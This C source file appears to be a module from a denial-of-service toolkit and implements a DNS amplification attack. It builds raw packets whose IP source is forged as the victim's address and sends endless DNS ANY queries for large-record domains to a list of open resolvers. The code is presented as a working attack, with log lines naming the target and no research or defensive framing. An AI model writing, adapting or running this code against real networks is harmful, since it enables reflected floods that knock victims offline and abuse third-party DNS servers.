/**
 * @file dns_amplification.c
 * @brief DNS Amplification attack
 *
 * This attack exploits open DNS resolvers to amplify traffic towards a target.
 * Sends small DNS queries with spoofed source IP (victim) that generate large
 * responses.
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "../common/logger.h"
#include "../common/util.h"

#define DNS_PORT 53
#define DNS_QUERY_TYPE_ANY 255 // ANY query returns large responses

// DNS header structure
struct dns_header {
  uint16_t id;
  uint16_t flags;
  uint16_t qdcount;
  uint16_t ancount;
  uint16_t nscount;
  uint16_t arcount;
} __attribute__((packed));

// DNS question section
struct dns_question {
  // Domain name (variable length, null-terminated labels)
  // uint16_t qtype;
  // uint16_t qclass;
} __attribute__((packed));

static uint16_t calculate_udp_checksum(struct iphdr *iph, struct udphdr *udph,
                                       char *payload, int payload_len) {
  // Simplified checksum calculation
  // In production, would use proper checksum calculation
  return 0; // Kernel fills this in for us on raw sockets
}

static int build_dns_query(char *buffer, size_t buflen, const char *domain) {
  struct dns_header *dns = (struct dns_header *)buffer;

  // DNS header
  dns->id = htons(rand() % 65536);
  dns->flags = htons(0x0100); // Standard query
  dns->qdcount = htons(1);    // One question
  dns->ancount = 0;
  dns->nscount = 0;
  dns->arcount = 0;

  char *qname = buffer + sizeof(struct dns_header);

  // Encode domain name in DNS format
  // e.g., "example.com" -> "\x07example\x03com\x00"
  const char *label_start = domain;
  char *ptr = qname;

  while (*label_start) {
    const char *label_end = strchr(label_start, '.');
    if (label_end == NULL) {
      label_end = label_start + strlen(label_start);
    }

    int label_len = label_end - label_start;
    *ptr++ = (char)label_len;
    memcpy(ptr, label_start, label_len);
    ptr += label_len;

    if (*label_end == '.') {
      label_start = label_end + 1;
    } else {
      break;
    }
  }
  *ptr++ = 0; // Null terminator

  // Question type and class
  uint16_t *qtype = (uint16_t *)ptr;
  *qtype = htons(DNS_QUERY_TYPE_ANY); // ANY query (amplification)
  ptr += 2;

  uint16_t *qclass = (uint16_t *)ptr;
  *qclass = htons(1); // IN (Internet)
  ptr += 2;

  return ptr - buffer;
}

void *attack_dns_amplification(void *arg) {
  struct {
    struct sockaddr_in victim;
    struct sockaddr_in *resolvers;
    size_t resolver_count;
  } *params = arg;

  log_info("Starting DNS Amplification attack");
  log_warn("Target: %s:%d", inet_ntoa(params->victim.sin_addr),
           ntohs(params->victim.sin_port));

  // Create raw socket for IP spoofing
  int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (raw_sock < 0) {
    log_error("Failed to create raw socket (need root): %s", strerror(errno));
    return NULL;
  }

  // Enable IP_HDRINCL so we can craft IP header
  int one = 1;
  if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
    log_error("Failed to set IP_HDRINCL: %s", strerror(errno));
    close(raw_sock);
    return NULL;
  }

  char packet[4096];
  struct iphdr *iph = (struct iphdr *)packet;
  struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
  char *dns_query = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

  // Build DNS query (targeting large domains for amplification)
  const char *amplification_domains[] = {
      "isc.org", // Returns DNSSEC records (large)
      "ripe.net", "any.icann.org", NULL};

  int domain_idx = 0;
  uint64_t packets_sent = 0;

  while (1) {
    // Build DNS query
    int dns_len =
        build_dns_query(dns_query, 512, amplification_domains[domain_idx]);

    // Rotate through domains
    domain_idx = (domain_idx + 1) % 3;

    // Send to each open resolver
    for (size_t i = 0; i < params->resolver_count; i++) {
      // Build IP header (spoofed source = victim)
      memset(iph, 0, sizeof(struct iphdr));
      iph->ihl = 5;
      iph->version = 4;
      iph->tos = 0;
      iph->tot_len =
          htons(sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len);
      iph->id = htons(rand() % 65536);
      iph->frag_off = 0;
      iph->ttl = 64;
      iph->protocol = IPPROTO_UDP;
      iph->check = 0;                              // Kernel fills this
      iph->saddr = params->victim.sin_addr.s_addr; // SPOOFED!
      iph->daddr = params->resolvers[i].sin_addr.s_addr;

      // Build UDP header
      memset(udph, 0, sizeof(struct udphdr));
      udph->source = htons(rand() % 65536);
      udph->dest = htons(DNS_PORT);
      udph->len = htons(sizeof(struct udphdr) + dns_len);
      udph->check = 0; // Optional for IPv4

      // Send packet
      struct sockaddr_in dest;
      dest.sin_family = AF_INET;
      dest.sin_addr = params->resolvers[i].sin_addr;
      dest.sin_port = htons(DNS_PORT);

      int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_len;
      ssize_t sent = sendto(raw_sock, packet, total_len, 0,
                            (struct sockaddr *)&dest, sizeof(dest));

      if (sent > 0) {
        packets_sent++;
      }
    }

    if (packets_sent % 1000 == 0) {
      log_info("DNS Amplification: %lu queries sent", packets_sent);
    }

    usleep(100); // Small delay to avoid overwhelming network
  }

  close(raw_sock);
  return NULL;
}
